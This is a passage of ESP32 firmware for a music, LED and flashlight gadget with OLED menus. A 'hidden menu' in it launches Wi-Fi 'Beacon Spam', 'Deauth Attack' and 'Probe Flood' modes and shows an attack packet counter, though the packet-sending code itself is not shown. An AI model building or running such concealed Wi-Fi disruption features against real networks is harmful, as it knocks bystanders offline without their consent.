    display.drawFastHLine(bx,by,bw,0x39E7);
    int fw = (animFrame/2) % bw;
    display.drawFastHLine(bx,by,fw,WHITE);
    display.fillCircle(bx+fw,by,2,WHITE);
    display.setTextSize(1);
    int e = (animFrame/2)/10;
    char tb[16]; snprintf(tb,sizeof(tb),"%d:%02d", e/60, e%60);
    int tw2 = strlen(tb)*6;
    display.setCursor((SCR_W-tw2)/2, 55); display.print(tb);
    display.display();
}

static void sBtMenu() {
    display.clearDisplay(); hdr("BLUETOOTH");
    const char* it[] = {"Scan Devices","Connect Last","Forget Saved"};
    for (int i = 0; i < 3; i++) {
        int y = 16 + i*12;
        drawRow(it[i], y, i == g.subSel, 2);
    }
    display.display();
}

static void sBtScan() {
    display.clearDisplay(); hdrL("BLUETOOTH");
    int cx=SCR_W/2, cy=26;
    for (int r=8; r<=18; r+=5)
        if ((animFrame + r) % 12 < 8) display.drawCircle(cx, cy, r, 0x39E7);
    iBT(cx-4, cy-4, WHITE);
    display.setTextSize(1); display.setTextColor(WHITE);
    const char* t = "SEARCHING"; int w = strlen(t)*6;
    display.setCursor((SCR_W-w)/2, 46); display.print(t);
    int dots = (animFrame/4)%9;
    for (int i = 0; i < 8; i++) {
        int x = 24 + i*11;
        if (i < dots) display.fillCircle(x, 58, 2, WHITE);
        else display.drawCircle(x, 58, 2, WHITE);
    }
    display.display();
}

static const char* LED_M[] = {"Effects","Music Sync","Brightness","WiFi Control"};
static void sLedMenu() {
    display.clearDisplay(); hdr("LED EFFECTS");
    drawMenuList(LED_M, 4, g.subSel, -1);
    display.display();
}
static const char* FX[] = {"Solid","Rainbow","Breathe","Chase"};
static void sLedFx() {
    display.clearDisplay(); hdr("EFFECTS");
    drawMenuList(FX, 4, g.subSel, -1);
    display.display();
}
static void sLedBright() {
    display.clearDisplay(); hdrL("BRIGHTNESS");
    int pct = (g.ledBright * 100) / 255;
    display.setTextSize(3); display.setTextColor(WHITE);
    char b[8]; snprintf(b,sizeof(b),"%d%%",pct);
    int tw = strlen(b)*18;
    display.setCursor((SCR_W-tw)/2, 22); display.print(b);
    display.drawRect(6,52,SCR_W-12,8,WHITE);
    int fw = (g.ledBright * (SCR_W-16))/255;
    if (fw > 0) display.fillRect(8,54,fw,4,WHITE);
    display.display();
}
static void sLedWifi() {
    display.clearDisplay(); hdrL("WIFI CONTROL");
    int cx=SCR_W/2, cy=30;
    for (int a = 215; a <= 325; a += 8) {
        float rad = a * 3.14159f / 180.0f;
        display.fillCircle(cx + (int)(cos(rad)*10), cy+10+(int)(sin(rad)*10), 2, WHITE);
        display.fillCircle(cx + (int)(cos(rad)*18), cy+10+(int)(sin(rad)*18), 2, WHITE);
    }
    display.fillCircle(cx, cy+10, 3, WHITE);
    display.setTextSize(1); display.setTextColor(WHITE);
    const char* t = webRunning ? "AP ACTIVE" : "AP OFF";
    int tw = strlen(t)*6;
    display.setCursor((SCR_W-tw)/2, 52); display.print(t);
    if (webRunning) {
        display.setCursor(4, 58);
        display.print("192.168.4.1");
    }
    display.display();
}

static const char* FL_M[] = {"Power: OFF","Bright: 75%","Color: White","Effect: Solid","Done"};
static void sFlash() {
    display.clearDisplay();
    display.drawFastHLine(0,0,SCR_W,WHITE);
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(4,5);
    display.print(g.flashOn ? "FLASHLIGHT [ON]" : "FLASHLIGHT [OFF]");
    drawBatteryLight(SCR_W-22, 4);
    const char* it[] = {"Power: ON","Bright: 75%","Color: White","Effect: Solid","Done"};
    int vis = 4;
    int off = (g.subSel >= 3) ? (g.subSel - 2) : 0;
    if (off + vis > 5) off = 1;
    for (int i = 0; i < vis; i++) {
        int idx = i + off, y = 16 + i*11;
        bool s = (idx == g.subSel);
        if (s) { display.fillRoundRect(0,y,SCR_W,10,3,WHITE); display.setTextColor(BLACK); display.fillTriangle(2,y+5,5,y+2,5,y+8,BLACK); }
        else { display.setTextColor(WHITE); display.fillTriangle(2,y+5,5,y+2,5,y+8,WHITE); }
        iFlash(9,y+1,s?BLACK:WHITE);
        display.setCursor(21,y+2); display.print(it[idx]);
        display.setTextColor(WHITE);
    }
    display.display();
}

static const char* SET[] = {"Display Sleep","Screen Bright","Auto BT","Device Info","Factory Reset"};
static void sSettings() {
    display.clearDisplay(); hdr("SETTINGS");
    drawMenuList(SET, 5, g.subSel, -1);
    display.display();
}

static void sWifiFiles() {
    display.clearDisplay(); hdrL("WIFI FILES");
    int cx=30, cy=32;
    display.fillCircle(cx, cy+6, 2, WHITE);
    for (int r = 5; r <= 14; r += 4)
        for (int a = 215; a <= 325; a += 12) {
            float rad = a * 3.14159f / 180.0f;
            display.drawPixel(cx + (int)(cos(rad)*r), cy+5+(int)(sin(rad)*r), WHITE);
        }
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(58, 18); display.print(webRunning ? "AP ACTIVE" : "AP OFF");
    if (webRunning) {
        display.setCursor(58, 30); display.print("ESP32-Gadget");
        display.setCursor(58, 40); display.print("192.168.4.1");
    }
    display.drawFastHLine(0, 50, SCR_W, 0x39E7);
    display.setCursor(4, 55); display.print("Open browser to upload");
    display.display();
}

static const char* HID[] = {"WiFi Tools","BT Tools","IR Remote"};
static void sHidden() {
    display.clearDisplay();
    display.fillRect(0,0,SCR_W,13,WHITE);
    display.setTextColor(BLACK); display.setTextSize(1);
    display.setCursor(4,3); display.print("HIDDEN MENU");
    display.fillCircle(SCR_W-12, 6, 3, BLACK);
    display.fillRect(SCR_W-15, 8, 6, 2, BLACK);
    display.setTextColor(WHITE);
    for (int i = 0; i < 3; i++) {
        int y = 18 + i*13;
        drawRow(HID[i], y, i == g.subSel, i==0?6:i==1?2:5);
    }
    display.display();
}

static const char* WT[] = {"Scan Networks","Beacon Spam","Deauth Attack","Probe Flood"};
static void sWifiTools() {
    display.clearDisplay(); hdrL("WIFI TOOLS");
    drawMenuList(WT, 4, g.subSel, -1);
    display.display();
}

static void sAttackRun() {
    display.clearDisplay();
    display.fillRect(0,0,SCR_W,13,WHITE);
    display.setTextColor(BLACK); display.setTextSize(1);
    display.setCursor(4,3); display.print("ATTACK ACTIVE");
    if ((animFrame/4) % 2 == 0) display.fillCircle(SCR_W-6, 6, 2, BLACK);
    display.setTextColor(WHITE);
    display.setCursor(4, 18);
    if (atkMode == ATK_BEACON) display.print("Beacon Spam");
    else if (atkMode == ATK_DEAUTH) display.print("Deauth");
    else if (atkMode == ATK_PROBE) display.print("Probe Flood");
    display.setCursor(4, 30); display.print("Target: broadcast");
    display.setTextSize(2);
    char b[12]; snprintf(b,sizeof(b),"%d", atkPkts);
    int tw = strlen(b)*12;
    display.setCursor((SCR_W-tw)/2, 42); display.print(b);
    display.setTextSize(1);
    display.setCursor((SCR_W-72)/2, 58); display.print("packets sent");
    display.display();
}

static void drawCurrent() {
    switch (g.mode) {
        case M_BOOT: sBoot(); break;
        case M_MAIN: sMain(); break;
        case M_SONGS: sSongs(); break;
        case M_PLAYER: sPlayer(); break;
        case M_BT_MENU: sBtMenu(); break;
        case M_BT_SCAN: sBtScan(); break;
        case M_LED_MENU: sLedMenu(); break;
        case M_LED_FX: sLedFx(); break;
        case M_LED_BRIGHT: sLedBright(); break;
        case M_LED_WIFI: sLedWifi(); break;
        case M_FLASH_MENU: sFlash(); break;
        case M_SETTINGS: sSettings(); break;
        case M_WIFI_FILES: sWifiFiles(); break;
        case M_HIDDEN: sHidden(); break;
        case M_WIFI_TOOLS: sWifiTools(); break;
        case M_ATTACK_RUN: sAttackRun(); break;
        default: break;
    }
}

// ═══ MENU HANDLERS ═══
static void onMain(int ev) {
    if (ev == 0) g.mainSel = (g.mainSel - 1 + 6) % 6;
    else if (ev == 1) g.mainSel = (g.mainSel + 1) % 6;
    else if (ev == 2) {
        switch (g.mainSel) {
            case 0: if (songCount) { playSong(random(0, songCount)); g.mode = M_PLAYER; } break;
            case 1: g.mode = M_SONGS; g.subSel = 0; break;
            case 2: g.mode = M_BT_MENU; g.subSel = 0; break;
            case 4: g.mode = M_LED_MENU; g.subSel = 0; break;
            case 5: g.mode = M_FLASH_MENU; g.subSel = 0; break;
        }
    }
}
static void onSongs(int ev) {
    int total = songCount + 1;
    if (ev == 0) g.subSel = (g.subSel - 1 + total) % total;
    else if (ev == 1) g.subSel = (g.subSel + 1) % total;
    else if (ev == 2) {
        if (g.subSel == 0) { g.mode = M_WIFI_FILES; startWeb(); }
        else { playSong(g.subSel - 1); g.mode = M_PLAYER; }
    } else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 1; }
}
static void onPlayer(int ev) {
    if (ev == 0) { g.volume = min(g.volume+5, 100); }
    else if (ev == 1) { g.volume = max(g.volume-5, 0); }
    else if (ev == 2) { g.isPlaying = !g.isPlaying; }
    else if (ev == 3) { g.mode = M_SONGS; g.subSel = g.currentSong + 1; }
}
static void onBtMenu(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 2 && g.subSel == 0) { g.mode = M_BT_SCAN; }
    else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 2; }
}
static void onLedMenu(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 4) % 4;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 4;
    else if (ev == 2) {
        if (g.subSel == 0) { g.mode = M_LED_FX; g.subSel = g.curEffect; }
        else if (g.subSel == 2) { g.mode = M_LED_BRIGHT; }
        else if (g.subSel == 3) { g.mode = M_LED_WIFI; if (!webRunning) startWeb(); }
    } else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 4; }
}
static void onLedFx(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 4) % 4;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 4;
    else if (ev == 2) g.curEffect = g.subSel;
    else if (ev == 3) { g.mode = M_LED_MENU; g.subSel = 0; }
}
static void onLedBright(int ev) {
    if (ev == 0) { g.ledBright = min(g.ledBright + 15, 255); strip.setBrightness(g.ledBright); }
    else if (ev == 1) { g.ledBright = max(g.ledBright - 15, 0); strip.setBrightness(g.ledBright); }
    else if (ev == 3) { g.mode = M_LED_MENU; g.subSel = 2; }
}
static void onLedWifi(int ev) {
    if (ev == 2) { if (!webRunning) startWeb(); else stopWeb(); }
    else if (ev == 3) { g.mode = M_LED_MENU; g.subSel = 3; }
}
static void onFlash(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 5) % 5;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 5;
    else if (ev == 2) {
        switch (g.subSel) {
            case 0: flashSet(!g.flashOn); break;
            case 1: g.flashBright = (g.flashBright + 25) % 125; if (!g.flashBright) g.flashBright = 25; flashApply(); break;
            case 2: g.flashColor = (g.flashColor + 1) % 7; flashApply(); break;
            case 3: g.flashEffect = (g.flashEffect + 1) % 5; break;
            case 4: g.mode = M_MAIN; g.mainSel = 5; break;
        }
    } else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 5; }
}
static void onSettings(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 5) % 5;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 5;
    else if (ev == 2) {
        if (g.subSel == 0) g.displaySleepEnabled = !g.displaySleepEnabled;
        else if (g.subSel == 1) { g.ledBright = (g.ledBright + 50) % 256; strip.setBrightness(g.ledBright); }
    } else if (ev == 3) { g.mode = M_MAIN; }
}
static void onWifiFiles(int ev) {
    if (ev == 3) { if (webRunning) stopWeb(); g.mode = M_SONGS; g.subSel = 0; }
}
static void onHidden(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 2 && g.subSel == 0) { g.mode = M_WIFI_TOOLS; g.subSel = 0; }
    else if (ev == 3) { g.mode = M_MAIN; }
}
static void onWifiTools(int ev) {
    if (ev == 0) g.subSel = (g.subSel - 1 + 4) % 4;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 4;
    else if (ev == 2) {
        if (g.subSel == 0) wifiScan();
        else if (g.subSel == 1) { startBeacon(); g.mode = M_ATTACK_RUN; }
        else if (g.subSel == 2) { if (!apCount) wifiScan(); if (apCount) { startDeauth(0); g.mode = M_ATTACK_RUN; } }
        else if (g.subSel == 3) { startProbe(); g.mode = M_ATTACK_RUN; }
    } else if (ev == 3) { g.mode = M_HIDDEN; g.subSel = 0; }
}
static void onAttack(int ev) {
    if (ev == 2 || ev == 3) { stopAttack(); g.mode = M_WIFI_TOOLS; g.subSel = 1; }
}

// ═══ BUTTONS ═══
struct Btn { uint8_t pin; bool last; unsigned long t; bool lf; };
static Btn bU = {BTN_UP, HIGH, 0, false};
static Btn bD = {BTN_DOWN, HIGH, 0, false};
static Btn bS = {BTN_SEL, HIGH, 0, false};
static Btn bB = {BTN_BACK, HIGH, 0, false};

static int pollButtons() {
    Btn* bs[4] = {&bU, &bD, &bS, &bB};
    unsigned long now = millis();
    for (int i = 0; i < 4; i++) {
        Btn* b = bs[i];
        bool cur = (digitalRead(b->pin) == LOW);
        if (cur && b->last == HIGH) {
            b->last = LOW; b->t = now; b->lf = false;
        } else if (!cur && b->last == LOW) {
            unsigned long held = now - b->t;
            b->last = HIGH;
            if (!b->lf && held >= DEBOUNCE_MS) return i;
        } else if (cur && !b->lf && (now - b->t) >= LONGPRESS_MS) {
            b->lf = true;
            return 4 + i;
        }
    }
    return -1;
}

// ═══ UI TASK ═══
static void uiTask(void*) {
    unsigned long lastDraw = 0;
    for (;;) {
        int ev = pollButtons();
        if (ev >= 0) wakeDisplay();
        checkSleep();

        if (webRunning) {
            ledServer.handleClient();
            fileServer.handleClient();
            attackServer.handleClient();
        }

        if (g.mode == M_LED_MENU || g.mode == M_LED_FX ||
            g.mode == M_LED_WIFI) updateLED();
        if (g.flashOn) flashApply();

        // button events
        if (ev >= 0 && ev < 4) {
            switch (g.mode) {
                case M_MAIN: onMain(ev); break;
                case M_SONGS: onSongs(ev); break;
                case M_PLAYER: onPlayer(ev); break;
                case M_BT_MENU: onBtMenu(ev); break;
                case M_LED_MENU: onLedMenu(ev); break;
                case M_LED_FX: onLedFx(ev); break;
                case M_LED_BRIGHT: onLedBright(ev); break;
                case M_LED_WIFI: onLedWifi(ev); break;
                case M_FLASH_MENU: onFlash(ev); break;
                case M_SETTINGS: onSettings(ev); break;
                case M_WIFI_FILES: onWifiFiles(ev); break;
                case M_HIDDEN: onHidden(ev); break;
                case M_WIFI_TOOLS: onWifiTools(ev); break;
                case M_ATTACK_RUN: onAttack(ev); break;
                default: if (ev == 3) g.mode = M_MAIN; break;
            }
        } else if (ev >= 4) {
            int idx = ev - 4;
            if (idx == 3) {
                flashSet(!g.flashOn);
                if (g.flashOn) { g.mode = M_FLASH_MENU; g.subSel = 0; }
            }
        }

        unsigned long now = millis();
        if (now - lastDraw > 100) {
            lastDraw = now;
            if (!displayOff) drawCurrent();
        }
        vTaskDelay(pdMS_TO_TICKS(15));
    }
}

static void audioTask(void*) {
    for (;;) {
        if (g.isPlaying && audioMP3 && audioMP3->isRunning()) {
            if (!audioMP3->loop()) { g.isPlaying = false; nextSong(); }
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

// ═══ SETUP ═══
void setup() {
    Serial.begin(115200);
    delay(500);
    Serial.println("\n=== SOUMYA Gadget v9.0 ===");

    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_SEL, INPUT_PULLUP);
    pinMode(BTN_BACK, INPUT_PULLUP);

    SPI.begin(PIN_SD_SCK, PIN_SD_MISO, PIN_SD_MOSI, PIN_SD_CS);
    if (!SD.begin(PIN_SD_CS)) Serial.println("[!] SD FAIL");
    else { Serial.println("[+] SD OK"); loadSongs(); Serial.printf("[+] %d songs\n", songCount); }

    Wire.begin(OLED_SDA, OLED_SCL);
    if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
        Serial.println("[!] OLED FAIL");
        while (1) delay(1000);
    }
    display.clearDisplay(); display.display();

    strip.begin();
    strip.setBrightness(g.ledBright);
    strip.clear(); strip.show();

    flashStrip.begin();
    flashStrip.setBrightness(g.flashBright * 255 / 100);
    flashStrip.clear(); flashStrip.show();

    audioRB = new AudioOutRB();
    randomSeed(analogRead(0));
    lastActivity = millis();

    xTaskCreatePinnedToCore(audioTask, "audio", 8192, nullptr, 2, nullptr, 1);
    xTaskCreatePinnedToCore(uiTask, "ui", 12288, nullptr, 1, nullptr, 0);
}

void loop() {
    vTaskDelay(pdMS_TO_TICKS(1000));
}
